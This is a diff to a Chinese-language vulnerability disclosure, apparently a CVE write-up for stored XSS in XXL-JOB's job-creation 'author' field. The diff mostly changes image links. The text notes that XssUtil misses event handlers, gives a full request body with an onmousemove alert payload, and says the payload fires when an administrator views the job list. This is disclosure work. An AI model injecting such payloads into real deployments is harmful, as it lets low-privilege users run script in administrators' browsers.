@@ -2,7 +2,7 @@
 
 
 
-![image-20260715233455491](C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20260715233455491.png)
+![image-20260715233455491](https://github.com/hhhh333/CVE/blob/7b7a2906fc9108262c17fa33ba5a3bcbea6fa47e/image-20260715233455491.png)
 
 首先创建一个普通用户账号，勾选通用执行器Sample(xxl-job-executor-sample)、AI执行器Sample(xxl-job-executor-sample-ai)选项
 
@@ -10,19 +10,19 @@
 
 `XssUtil`虽然进行了XSS过滤，但未对`oncopy`、`onmousemove`等事件处理器进行正则匹配，导致触发XSS漏洞。
 
-![image-20260715234747279](C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20260715234747279.png)
+![image-20260715234747279](https://github.com/hhhh333/CVE/blob/7b7a2906fc9108262c17fa33ba5a3bcbea6fa47e/image-20260715234747279.png)
 
 `author` 参数存在XSS漏洞
 
-![image-20260716000749222](C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20260716000749222.png)
+![image-20260716000749222](https://github.com/hhhh333/CVE/blob/7b7a2906fc9108262c17fa33ba5a3bcbea6fa47e/image-20260715234747279.png)
 
 insert路径
 
-![image-20260715235633636](C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20260715235633636.png)
+![image-20260715235633636](https://github.com/hhhh333/CVE/blob/7b7a2906fc9108262c17fa33ba5a3bcbea6fa47e/image-20260715235705809.png)
 
 xxljobinfo类中的参数
 
-![image-20260715235705809](C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20260715235705809.png)
+![image-20260715235705809](https://github.com/hhhh333/CVE/blob/7b7a2906fc9108262c17fa33ba5a3bcbea6fa47e/image-20260716000749222.png)
 
 
 
@@ -49,10 +49,10 @@ Priority: u=0
 jobGroup=1&name=qqqq&author=%3Ca+onmousemove%3Dalert(%22xss%22)%3Exss&alarmEmail=&scheduleType=CRON&scheduleConf=0%2F1+*+*+*+*+%3F&cronGen_display=0%2F1+*+*+*+*+%3F&second=3&schedule_conf_CRON=0%2F1+*+*+*+*+%3F&schedule_conf_FIX_RATE=&schedule_conf_FIX_DELAY=&glueType=BEAN&executorHandler=a1111&executorParam=&executorRouteStrategy=FIRST&childJobId=&misfireStrategy=DO_NOTHING&executorBlockStrategy=SERIAL_EXECUTION&executorTimeout=0&executorFailRetryCount=0&glueRemark=GLUE%E4%BB%A3%E7%A0%81%E5%88%9D%E5%A7%8B%E5%8C%96&glueSource=
 ```
 
-![image-20260716001005267](C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20260716001005267.png)
+![image-20260716001005267](https://github.com/hhhh333/CVE/blob/7b7a2906fc9108262c17fa33ba5a3bcbea6fa47e/image-20260716001005267.png)
 
 当管理员查看任务管理时，可被触发
 
-![image-20260716001103740](C:\Users\86133\AppData\Roaming\Typora\typora-user-images\image-20260716001103740.png)
+![image-20260716001103740](https://github.com/hhhh333/CVE/blob/7b7a2906fc9108262c17fa33ba5a3bcbea6fa47e/image-20260716001103740.png)
 
 The malicious code is executed successfully.
